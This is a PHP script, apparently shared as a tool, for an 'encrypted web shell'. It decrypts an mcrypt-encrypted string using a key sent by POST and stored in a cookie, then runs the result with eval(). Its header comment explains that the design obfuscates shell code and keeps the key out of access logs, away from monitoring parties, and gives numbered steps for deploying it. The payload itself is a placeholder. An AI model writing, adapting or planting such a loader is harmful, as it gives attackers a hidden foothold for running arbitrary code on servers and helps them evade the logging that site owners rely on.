<?php
/**************************
Encrypted Web Shell
Author : kevinnivek
Description : 
This code uses mcrypt to encrpyt raw PHP code (wihtout "<?php ?>").
It then executes the code after decrypting it. This can potentially aid in the obfuscation (and potentially unrecoverable)
of your code, whether its shell, penetration testing or remote management and systems administration.

The key item to note here is that the key can be delivered to decrypt + run the code via a http POST, instead of a GET.
What does this mean? It means that the key you pass to decrypt will be harder to capture and utilize by monitoring parties or 
via standard apache / nginx access logs. GETs are usually logged, but POSTs are not usually logged without additional 
custom modules or configuration directives.

Instructions : 

1. Load your code into a text file, read the contents of the file via file_get_contents and use the encrypt function to encrypt it with
a strong key.
2. Delete the file and the file_get_contents (save your key)
3. Paste the encrypted code into the $code variable
4. Run the file and enter the key in the input box in your browser
5. It should set a cookie wtih the key and refresh the page with the executed code
6. Some code or conditions in code may not execute due to it potentially not being escaped properly.

****************************/

$key = '1234567891011120';
define('IV_SIZE', mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

function encrypt($key, $payload) {
  $iv = mcrypt_create_iv(IV_SIZE, MCRYPT_DEV_URANDOM);
  $crypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $payload, MCRYPT_MODE_CBC, $iv);
  $combo = $iv . $crypt;
  $garble = base64_encode($iv . $crypt);
  return $garble;
}

function decrypt($key, $garble) {
  $combo = base64_decode($garble);
  $iv = substr($combo, 0, IV_SIZE);
  $crypt = substr($combo, IV_SIZE, strlen($combo));
  $payload = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $crypt, MCRYPT_MODE_CBC, $iv);
  return $payload;
}

/* Get code to encrypt it
$code_file = file_get_contents('./web-shell.txt');
$code_enc = encrypt($key, $code_file);
*/

if (!empty($_POST['dec'])) {
	// Regardless of what the POST was, set it to the cookie. If it isn't the right key, it wont decrypt anyways :)
        setcookie("dec", $_POST['dec'], time()+3600);
        $_COOKIE['dec'] = $_POST['dec'];
        header("Refresh:0");
}

if (isset($_COOKIE['dec'])) {
	// If the cookie is set , try decrypting and running
        $key = $_COOKIE['dec'];
	$code = "paste encrypted string here";
        eval(decrypt($key, $code));
} else {
	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
	// Also deliver the input form by default.
        setcookie("dec", "", time() - 3600);
        $_COOKIE['dec'] = null;
        echo '<html><body><form action="encrypted-web-shell.php" method="post">
                <input type="password" autocomplete="off" class="inputtext" name="dec" id="dec">
                <input value="submit" type="submit">
                </form>';
}

?>
